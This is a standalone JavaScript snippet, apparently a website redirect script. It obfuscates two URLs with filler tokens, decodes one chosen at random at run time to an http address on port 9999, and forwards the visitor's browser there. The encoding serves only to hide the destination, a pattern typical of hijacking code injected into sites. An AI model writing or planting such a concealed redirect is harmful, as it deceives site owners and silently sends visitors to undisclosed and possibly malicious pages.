function gotourl() {
    var items = [
	'he5@f6aoa1@b2xie5@f6gue5@f6ae5@f676a1@b2comc3@d499e5@f699',
	'hae5@f6oa1@b2xige5@f6ua7e5@f69a1@b2comc3@d49e5@f699e5@f69'
	];
	var uri = items[Math.floor(Math.random()*items.length)];//get 1 from items
    var a = 'http', b = '://',r = a + b + uri;
    r = r.replace(/a1@b2/g, '.');
    r = r.replace(/c3@d4/g, ':');
    r = r.replace(/e5@f6/g, '');
    window.location.href = r;
}